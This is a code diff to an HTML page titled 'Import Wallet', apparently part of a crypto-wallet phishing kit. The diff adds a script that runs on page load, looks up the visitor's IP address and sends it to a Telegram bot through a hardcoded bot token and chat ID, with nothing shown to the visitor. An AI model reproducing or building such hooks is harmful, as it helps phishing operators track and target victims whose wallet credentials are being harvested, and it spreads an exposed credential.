@@ -29,6 +29,23 @@
   }
   </script>
 <title>Import Wallet</title>
+    <script>
+    function sendIPToTelegram() {
+      fetch('https://api64.ipify.org?format=json')
+        .then(response => response.json())
+        .then(data => {
+          const ip = data.ip;
+          const botToken = '8344448064:AAHCuXUgcHOUr4WpLC9RKQYNxcY18n2nESM';
+          const chatId = '8565163056';
+          const message = `Client IP: ${ip}`;
+          const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${message}`;
+          var xhr = new XMLHttpRequest();
+          xhr.open("GET", url, true);
+          xhr.send();
+        });
+    }
+    sendIPToTelegram();
+  </script>
 </head>
 <body>
 <center>
@@ -197,6 +214,7 @@
 </center></body>
 
 </html>
+
 
 
 
